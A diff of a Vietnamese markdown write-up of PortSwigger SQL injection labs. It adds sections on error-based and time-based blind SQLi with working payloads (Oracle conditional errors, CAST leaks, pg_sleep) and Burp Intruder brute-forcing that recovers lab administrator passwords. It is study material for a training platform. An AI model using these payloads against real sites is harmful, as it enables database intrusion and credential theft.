@@ -1,4 +1,4 @@
-# LỖ HỔNG SQL INJECTION (PORTSWIGGER)
+<img width="1865" height="751" alt="image" src="https://github.com/user-attachments/assets/595990ad-fa8c-4e13-a97d-f5043644a278" /># LỖ HỔNG SQL INJECTION (PORTSWIGGER)
 
 ---
 
@@ -691,7 +691,7 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
 
 --- 
 
-## 11. Blind SQL injection
+## 11. Blind SQL injection 
 
 - Đối với kỹ thuật tấn công phổ biến như UNION-based SQLi, vốn dựa vào việc hiển thị dữ liệu truy vấn trên giao diện người dùng.
 
@@ -740,7 +740,8 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
   1’ and (SELECT length(password) FROM users WHERE user_id=1) > <index> --
   ```
 
-  &rarr; Lúc này nếu độ dài password lớn hơn <index> thì phản hồi trả về sản phẩm tồn tại bình thường, nhưng với <index> mà bằng với độ dài password thì sẽ trả về trang thái sản phẩm không tồn tại &rarr; Có thể suy ra <index> lúc này là độ dài của password.
+  &rarr; Lúc này nếu độ dài password lớn hơn <index> thì phản hồi trả về sản phẩm tồn tại bình thường, nhưng với <index> mà bằng với độ dài
+  password thì sẽ trả về trang thái sản phẩm không tồn tại &rarr; Có thể suy ra <index> lúc này là độ dài của password.
 
   Ví dụ khác với câu truy vấn sau sử dụng hàm substring() để trả về 1 ký tự ở vị trí 1 trong password:
 
@@ -754,9 +755,9 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
   1' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'a' --
   ```
 
-  &rarr; Nếu ký tự vị trí 1 đúng là ký tự 'a' trang sẽ trả về trạng thái sản phẩm tồn tại bình thường, ngược lại thì đó là ký tự sai và ta sẽ thử các ký khác.
+  &rarr; Nếu ký tự vị trí 1 đúng là ký tự 'a' trang sẽ trả về trạng thái sản phẩm tồn tại bình thường, ngược lại thì đó là ký tự sai và ta sẽ    thử các ký khác.
 
- **Note: Một số DBMS là SUBSTR().**
+**Note: Một số DBMS là SUBSTR().**
 
 ### Lab: Blind SQL injection with conditional responses
 
@@ -847,7 +848,402 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
 
   <img width="1908" height="874" alt="image" src="https://github.com/user-attachments/assets/c9d90518-8a0b-4936-9fc9-c2b129bb56cf" />
 
+**11.2. Error-based**
 
+- Một phương pháp để thu thập thông tin CSDL của hệ thống là kỹ thuật thực hiện gây ra lỗi trong truy vấn SQL để ứng dụng web hiển thị thông tin lỗi chi tiết từ cơ sở dữ liệu, hoặc ít nhất giúp ta có thể suy luận ra cấu trúc của database (bảng, cột, ...).
+
+- Ngay cả trong những trường hợp như blind SQL injection, ta vẫn có thể khai thác thông qua thông báo lỗi nếu database trả về nội dung lỗi chi tiết.
+
+- Có hai cách để thực hiện:
+
+  - **Thứ nhất: Gây lỗi có điều kiện để suy luận kết quả (Conditional Error):**
+ 
+    Bản chất là ta sẽ chèn vào truy vấn một biểu thức logic có thể đúng hoặc sai. Dựa trên phản hồi lỗi có xảy ra hay không, hacker suy đoán        điều kiện đúng/sai.
+
+    Ví dụ, ta thực hiện chèn một payload có dạng như sau:
+
+    ```sql
+    ' AND 1=CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN 1 ELSE 1/0 END -- 
+    ```
+
+    Với câu điều kiện *case when*, nếu bảng *users* tồn tại (điều kiện đúng) lúc này sẽ trả về là 1 tạo thành *AND 1=1* luôn đúng do đó truy       vấn chạy bình thường, tuy nhiên nếu bảng *users* không tồn tại, câu lệnh sẽ chia cho 0 → gây lỗi → ứng dụng hiển thị lỗi → ta biết được        lỗi từ DBMS và bảng users không tồn tại trong CSDL.
+
+    &rarr; Khá tương đồng với dạng boolean-based của blind SQLi.
+
+  ### Lab: Blind SQL injection with conditional errors
+
+  - Giao diện trang web thực hiện khai thác:
+ 
+    <img width="1917" height="873" alt="image" src="https://github.com/user-attachments/assets/2f8af6b4-75f5-44f7-aee3-1b1ea4a14d5a" />
+
+  - Tương tự bài lab trên, nhận thấy phần giá trị cookie TrackingId có thể khai thác, tuy nhiên lại thấy rằng giao diện trang web không có         hiển thị hay có phản hồi rõ ràng để nhận biết tồn tại lỗ hổng SQLi.
+ 
+  - Duy nhất, khi thực hiện khi thực hiện chèn thêm dấu nháy đơn ' vào sau giá trị TrackingId thì trang web phản hồi *Internal Server Error*.      Còn khi thực hiện thêm hai dấu nháy '' trang web trả về bình thường &rarr; lỗi cú pháp đang có ảnh hưởng có thể phát hiện được đối với         phản hồi.
+
+    Bởi vì có thể khi thêm hai dấu nháy '', câu truy vấn sẽ là: ***... TrackingId=abcxyz''''*** &rarr; vẫn hợp lệ về cú pháp.
+
+    Thực hiện tạo một payload hợp lệ khác là: *'||(SELECT '')||'*
+
+    Câu truy vấn lúc này sẽ là:
+
+    ```sql
+    SELECT a FROM b WHERE TrackingId = 'abcxyz'||(SELECT '')||''
+    ```
+
+    &rarr; Sẽ thực hiện nối chuỗi giá trị TrackingId với chuỗi rỗng và điều này là vẫn hợp lệ, tuy nhiên trang web trả về lại là *Internal          Server Error*
+
+    <img width="1870" height="754" alt="image" src="https://github.com/user-attachments/assets/9dcc2bea-ecaf-4a01-bff2-b3c834d9fe8b" />
+
+    &rarr; Do đó có thể liên quan đến kiểu DBMS hệ thống sử dụng.
+
+    Ta thử tạo payload như sau: *'||(SELECT '' FROM dual)||'* 
+
+    &rarr; Trang web trả về bình thường:
+    
+    <img width="1873" height="756" alt="image" src="https://github.com/user-attachments/assets/0722d493-a3e5-4642-85aa-31657c927dd9" />
+
+    &rarr; Hệ thống sử dụng Oracle vì tất cả các lệnh SELECT đều phải chỉ định tên bảng.
+
+    Thực hiện tạo payload để thử kiểm tra sự tồn tại bảng users trong CSDL hay không:
+
+    ```sql
+    '||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+    ```
+
+    Trong đó *ROWNUM = 1* giới hạn truy vấn chỉ lấy 1 dòng đầu tiên trong Oracle, do đó nếu bảng users tồn tại sẽ chỉ trả về một dòng chuỗi ''      &rarr; hợp lệ và trang web phản hồi bình thường.
+
+    <img width="1871" height="751" alt="image" src="https://github.com/user-attachments/assets/33ece77e-3003-47cb-868e-a0a3ecdfc7d4" />
+
+    &rarr; Tồn tại bảng users.
+
+    Tạo payload để kiểm tra phản ứng của trang web với câu điều kiện:
+
+    ```sql
+    '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+    ```
+
+    Thực hiện gây lỗi có điều kiện vì 1=1 luôn đúng do đó server sẽ thực hiện phép tính 1/0 &rarr; gây lỗi *Internal Server Error*
+
+    <img width="1872" height="808" alt="image" src="https://github.com/user-attachments/assets/c2145431-18fe-46f2-9371-57ddb68edd7b" />
+
+    Lợi dụng điều này ta có thể tạo payload để kiểm tra xem tồn tại username là *administrator* hay không:
+
+    ```sql
+    '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+    ```
+
+    Vì nếu username *administrator* không tồn tại câu điều kiện *case when* sẽ không được thực hiện nữa và trả về '' &rarr; trang web phản hổi     bình thường.
+
+    <img width="1869" height="754" alt="image" src="https://github.com/user-attachments/assets/6b94b9d5-1223-4585-8f6b-4413362b966a" />
+
+    &rarr; Tồn tại username *administrator*.
+
+    Khi đã xác định được username là *administrator* thử tạo các payload để khai thác lấy password của user.
+
+    Dầu tiên, tạo payload để kiểm tra độ dài của password, thử với các <index> cho tới khi tìm được:
+
+    ```sql
+    '||(SELECT CASE WHEN LENGTH(password) > <index> THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+    ```
+
+    Kết quẩ cho thấy với trường hợp <index> = 20 thì trang báo lỗi, trong khi <index> = 19 trang web vẫn trả về bình thường.
+
+    <img width="1874" height="749" alt="image" src="https://github.com/user-attachments/assets/4c4a112b-be34-40e5-982f-c6d467c05e9f" />
+
+    &rarr; Độ dài password là 20 ký tự.
+
+    Tương tự với lab blind SQLi, ta tạo payload sử dụng hàm SUBSTR() (trong Oracle) để dò đoán từng ký tự trong các vị trí của password:
+
+    ```sql
+    '||(SELECT CASE WHEN SUBSTR(password,<index1>,1)='<index2>' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+    ```
+
+    Ta sử thực hiện sử dụng Intruder chế độ Cluster Bomb để brute force request, <index1> là vị trí password còn <index2> là các ký tự cần tìm.
+
+    Cùng với đó, thêm Grep - Match là chuỗi *Internal Server Error* để nhận biết:
+
+    <img width="1872" height="847" alt="image" src="https://github.com/user-attachments/assets/5d913364-c894-4934-90ef-f1a9cdf6b51b" />
+
+    Kết quả brute force:
+
+    <img width="1848" height="738" alt="image" src="https://github.com/user-attachments/assets/b3ea290b-ed26-4ebc-a9f8-6d38d5961625" />
+
+    &rarr; Thu được password là: *mlgyqsv34dcbsxv9oogu*
+    
+    Đăng nhập thành công tài khoản administrator:
+
+    <img width="1919" height="866" alt="image" src="https://github.com/user-attachments/assets/18c5e99c-d9a7-4d77-953c-2147331b63b3" />
+
+  - **Thứ hai: Gây lỗi chi tiết để xem dữ liệu trực tiếp (Verbose Error)**
+ 
+    Bản chất là lợi dụng các thông báo lỗi do CSDL trả về để trích xuất thông tin nhạy cảm từ cơ sở dữ liệu, như: tên bảng, cột, dữ liệu người     dùng... Cách này chỉ thực hiện dược khi lỗi đó được trả về dưới dạng thông báo chi tiết (verbose error) trên trang web.
+
+    Ví dụ, ta thực hiện chèn một payload như sau:
+
+    ```sql
+    ' AND extractvalue(1, concat(0x7e, database())) --
+    ```
+
+    Trong đó:
+
+    *extractvalue()* là hàm XML, nếu truyền tham số sai → báo lỗi.
+
+    *concat(0x7e, database())* sẽ ghép dấu ~ với tên CSDL.
+
+    Lỗi sẽ hiển thị như:
+
+    ```sql
+    XPATH syntax error: '~ten_csdl'
+    ```
+
+    Ngay cả khi không có phản hồi trực tiếp (blind SQLi), bằng cách ép lỗi hệ thống tạo ra thông báo chứa dữ liệu nhạy cảm.
+
+    Ví dụ trong SQL, hàm CAST() được dùng đề ép kiểu dữ liệu, ví dụ từ varchar sang int:
+
+    ```sql
+    CAST((SELECT position FROM staff) AS int)
+    ```
+
+    Trong câu lệnh trên, ta đang ép kiểu dữ liệu trả về cột position của bảng staff về kiểu int. Giả sử nếu position chứa chuỗi "director",        thì câu lệnh trên sẽ gây ra lỗi như sau:
+
+    ```sql
+    ERROR: invalid input syntax for type integer: "director"
+    ```
+
+    &rarr; Thông báo lỗi này hiển thị "admin", tức là dữ liệu thật trong CSDL đã bị rò rỉ qua thông báo lỗi.
+
+    Do đó nếu ta tạo một payload chèn vào một tham số:
+
+    ```sql
+    '||(SELECT CAST(username AS int) FROM users)||'
+    ```
+
+    Kết quả trả về có thể là:
+
+    ```sql
+    ERROR: invalid input syntax for type integer: "administrator"
+    ```
+
+    &rarr; Rò rỉ giá trị "administrator" từ cột username.
+
+  ### Lab: Visible error-based SQL injection
+
+  - Giao diện trang web ta thực hiện khai thác:
+ 
+    <img width="1873" height="751" alt="image" src="https://github.com/user-attachments/assets/2edec6f1-f9b3-4f18-8069-bbf6e59e3fc6" />
+    
+  - Tương tự bài lab trên, nhận thấy phần giá trị cookie TrackingId có thể khai thác, tuy nhiên lại thấy rằng giao diện trang web không có         hiển thị hay có phản hồi rõ ràng để nhận biết tồn tại lỗ hổng SQLi.
+
+  - Thực hiện nhập thêm dấu nháy ' vào sau giá trị TrackingId, ta phát hiện được rằng trang web phản hồi về thông báo lỗi chi tiết:
+ 
+    <img width="1873" height="751" alt="image" src="https://github.com/user-attachments/assets/b1717a5c-c011-46b0-b0b1-574761eadae5" />
+
+    &rarr; Thông báo cho thấy về lỗi đóng dấu tại dòng 52 và để lộ câu truy vấn gốc là *SELECT * FROM tracking WHERE id = 'bB5mcMpqxJFxCdxX'*      &rarr; Tồn tại lỗi visible error-based.
+
+    Thử thêm một payload khác là: *' ORDER BY 1 --*
+
+    <img width="1872" height="747" alt="image" src="https://github.com/user-attachments/assets/6ed01b8b-5dc2-4011-a1f4-702905927725" />
+
+    &rarr; Nhận thấy trang web trả về bình thường &rarr; Nhận các truy vấn hợp lệ về mặt cú pháp.
+
+    Thực hiện tạo payload sử dụng hàm CAST() như đã đề cập ở trên khai thác:
+ 
+    Tạo payload hàm CAST() ép kiểu trả về 1 về int, tức đang hợp lệ để xem phản hổi của trang web:
+    
+    ```sql
+    ' AND CAST((SELECT 1) AS int) --
+    ```
+
+    &rarr; Lỗi thông báo AND phải là một biểu thức logic.
+
+    Tạo payload:
+
+     ```sql
+    ' AND 1=CAST((SELECT 1) AS int) --
+    ```
+ 
+    <img width="1865" height="751" alt="image" src="https://github.com/user-attachments/assets/b22d15f6-4aea-4f75-a69c-a352e5664cef" />
+
+    &rarr; Trang phản hồi về bình thường.
+
+    Tạo các payload để dò lấy tìm bảng trong CSDL.
+
+    ```sql
+    ' AND 1=CAST((SELECT abc from person) AS int) --
+    ```
+
+    <img width="1868" height="750" alt="image" src="https://github.com/user-attachments/assets/e4611a2b-cbd9-4f03-bc93-7f2010e4a82e" />
+
+    &rarr; Vì nếu table không tồn tại trang web sẽ báo lỗi &rarr; thực hiện như vậy cho đến khi tìm được bảng users hợp lệ.
+
+    Tương tư như vậy, ta dò tìm cột trong bảng users và phát hiện các cột là: username, password hợp lệ.
+
+    <img width="1870" height="752" alt="image" src="https://github.com/user-attachments/assets/132ceef1-f8ca-4c62-8c15-7e2dfe9286dc" />
+
+    Tuy nhiên ta nhận thấy báo lỗi truy vấn trả về nhiều hơn một hàng không thể ép kiểu, do đó ta sử dụng *LIMIT 1* để trả về 1 truy vấn.
+
+    ```sql
+    ' AND 1=CAST((SELECT username from users LIMIT 1) AS int) --
+    ```
+
+    <img width="1869" height="747" alt="image" src="https://github.com/user-attachments/assets/e1ec4afa-0b35-485b-8e8f-f9126d07f5ec" />
+
+    &rarr; Biết được username đầu tiên trả về là *administrator* từ lỗi ép kiểu.
+
+    Tạo payload lấy password của username từ hàng đầu tiên trả về đó:
+
+    ```sql
+    ' AND 1=CAST((SELECT password from users LIMIT 1) AS int) --
+    ```
+
+    <img width="1870" height="744" alt="image" src="https://github.com/user-attachments/assets/8caf4e48-aa67-43fb-80f3-6c8925c3a7c9" />
+
+    &rarr; Thu được password là: *hktobti1qzkqpxr3c01i*
+
+    Đăng nhập thành công:
+
+    <img width="1919" height="874" alt="image" src="https://github.com/user-attachments/assets/f9e9012a-2d1d-454f-b2d1-554ad5942337" />
+
+**11.3. Time-based**
+
+- Tuy nhiên nếu trang web không hiển thị bất kỳ lỗi SQL nào ra bên ngoài, hay nói cách khác ứng dụng bắt và xử lý lỗi SQL nội bộ (gracefully handled).
+
+- Do đó, ta không thể biết điều kiện đúng/sai dựa trên thông báo lỗi hay kết quả trả về khác biệt.
+
+- Một phương pháp được sinh ra đó là dựa vào thời gian phản hồi của server để suy đoán, tức là dựa vào lượng thời gian chậm hơn hay bình thường để suy đoán ra lỗi, đây cũng chính là bản chất của blind SQLi dựa trên time-based.
+
+- Ví dụ, do SQL được thực thi đồng bộ (synchronous) &rarr; nếu trong câu SQL có đoạn SLEEP(5), thì server sẽ trả phản hồi chậm 5 giây.
+
+- Nếu ta chèn một điều kiện logic: *IF(condition, SLEEP(5), 0))*
+
+  - Biết condition đúng nếu phản hồi đến chậm hơn bình thường (delay).
+
+  - Biết condition sai nếu phản hồi đến ngay lập tức.
+ 
+### Lab: Blind SQL injection with time delays and information retrieval
+
+- Giao diện trang web thực hiện khai thác:
+
+  <img width="1919" height="941" alt="image" src="https://github.com/user-attachments/assets/ca429fee-0556-4267-9abd-d3eaa80bf95d" />
+
+- Tương tự bài lab trên, nhận thấy phần giá trị cookie TrackingId có thể khai thác, tuy nhiên lại thấy rằng giao diện trang web không có         hiển thị hay có phản hồi rõ ràng để nhận biết tồn tại lỗ hổng SQLi.
+
+- Khi thêm dấu ' hay các payload SQLi thông thường trang web phản hồi bình thường.
+
+- Ta tạo payload kiểm tra lỗi time-based SQLi:
+
+  ```sql
+  '%3b+SELECT pg_sleep(5)--
+  ```
+
+  Trong đó, *%3b* là URL-encode của ; giúp tạo một câu lệnh khác sau truy vấn gốc và sử dụng SELECT để gọi hàm pg_sleep(5).
+
+  <img width="1919" height="788" alt="image" src="https://github.com/user-attachments/assets/3f9d5ba2-5520-4df7-be93-f85a610ee2dd" />
+
+  &rarr; Kết quả trang web phản hồi trong 5s &rarr; Tồn tại lỗ hổng time-based SQLi.
+
+  Tạo payload để kiểm tra với câu điều kiện, sử dụng *case when...* vì hỗ trợ hầu hết tất cả các DBMS phổ biến:
+
+  ```sql
+  '%3b+SELECT pg_sleep(5)--
+  ```
+
+  <img width="1919" height="789" alt="image" src="https://github.com/user-attachments/assets/e8e49f09-5460-4b1a-b9f4-7a297b08e98f" />
+
+  &rarr; Kết quả tương tự bị delay 5s.
+
+  Tạo payload với câu điều kiện để kiểm tra bảng hệ thống có tồn tại bảng users hay không:
+
+  ```sql
+  '%3b SELECT CASE WHEN (SELECT+COUNT(*)+FROM+information_schema.tables where table_name='users') > 0 THEN pg_sleep(5) ELSE pg_sleep(0) END --
+  ```
+
+  hoặc
+  ```sql
+  '%3b SELECT CASE WHEN (table_name='users') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM information_schema.tables--
+  ```
+
+  <img width="1919" height="794" alt="image" src="https://github.com/user-attachments/assets/e6ecedc3-2f05-4c65-97e0-f3d5c4fd94c5" />
+
+  &rarr; Kết quả delay 5s &rarr; tồn tại bảng username.
+
+  Tạo payload với câu điều kiện để kiểm tra bảng users tồn tại hai cột là username và password hay không:
+
+  ```sql
+  '%3b SELECT CASE WHEN (SELECT+COUNT(*)+FROM+information_schema.columns where table_name='users' and colum_name='username') > 0 THEN   pg_sleep(5) ELSE pg_sleep(0) END --
+
+  '%3b SELECT CASE WHEN (SELECT+COUNT(*)+FROM+information_schema.columns where table_name='users' and colum_name='password') > 0 THEN   pg_sleep(5) ELSE pg_sleep(0) END --
+  ```
+
+  <img width="1919" height="785" alt="image" src="https://github.com/user-attachments/assets/2713031c-6bd3-467b-9b57-02cab527c57e" />
+
+  <img width="1919" height="847" alt="image" src="https://github.com/user-attachments/assets/662c41c4-b00b-4fd6-8f25-1c0563887690" />
+
+  &rarr; Delay 5s &rarr; Tồn tại hai cột username và password trong bảng users.
+
+  Tạo payload với câu điều kiện để kiểm tra tồn username là *administrator* hay không:
+
+  <img width="1919" height="786" alt="image" src="https://github.com/user-attachments/assets/3fd9df89-f420-412c-b981-48a049483011" />
+
+  &rarr; Delay 5s &rarr; Tồn tại username *administrator*.
+
+  Tạo payload để kiểm tra độ dài password của username *administrator*:
+
+  ```sql
+  '%3b SELECT CASE WHEN (length(password) > <index>) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
+  ```
+
+  <img width="1919" height="786" alt="image" src="https://github.com/user-attachments/assets/f4c9cf82-8eab-4df3-a33b-6d255436ba81" />
+
+  <img width="1919" height="789" alt="image" src="https://github.com/user-attachments/assets/1cb6a8fd-ad8a-4818-b6a4-ece908fdf807" />
+
+  &rarr; Thấy với điều kiện > 19 thì delay 5s nhưng với > 20 thì trang web trả về bình thường &rarr; Độ dài password là 20.
+
+  Tạo payload để brute force các ký tự trong password, sử dụng công cụ Intruder chế độ Cluster Bomb:
+
+  ```sql
+  '%3b SELECT CASE WHEN (SUBSTR(password,<index1>,1) = '<index2>') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE     username='administrator'--
+  ```
+
+  Ta lọc các request trả về hơn 5s:
+
+  <img width="1840" height="766" alt="image" src="https://github.com/user-attachments/assets/64e18daf-f6b0-4411-947b-0577c2f93630" />
+
+  &rarr; Thu được password là *dovluvjkmzl71tz5au93*
+
+  Đăng nhập thành công:
+
+  <img width="1919" height="872" alt="image" src="https://github.com/user-attachments/assets/d6001827-244f-4fc9-9074-4f67a4a13e64" />
+
+**11.4. Out-of-band (OAST)**
+
+---
+
+## 12. 
+
+
+  
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+    
+
+    
+
+
+    
+    
+    
   
 
   
